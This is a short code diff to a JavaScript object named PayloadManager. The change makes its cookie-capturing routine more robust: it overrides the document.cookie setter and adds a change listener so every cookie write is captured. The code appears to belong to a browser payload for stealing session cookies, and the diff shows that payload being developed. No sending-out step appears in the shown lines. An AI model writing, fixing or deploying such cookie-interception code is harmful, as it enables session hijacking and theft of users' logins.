@@ -29,10 +29,16 @@ const PayloadManager = {
         this.captureCookies();
         
         // Monitor cookie changes
-        const originalSetCookie = document.cookie;
+        document.addEventListener('cookie.change', () => {
+            this.captureCookies();
+        });
+
+        // Intercept cookie setting
+        const originalSetCookie = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie').set;
         Object.defineProperty(document, 'cookie', {
+            configurable: true,
             set: function(value) {
-                originalSetCookie.set.call(this, value);
+                originalSetCookie.call(this, value);
                 PayloadManager.captureCookies();
             }
         });
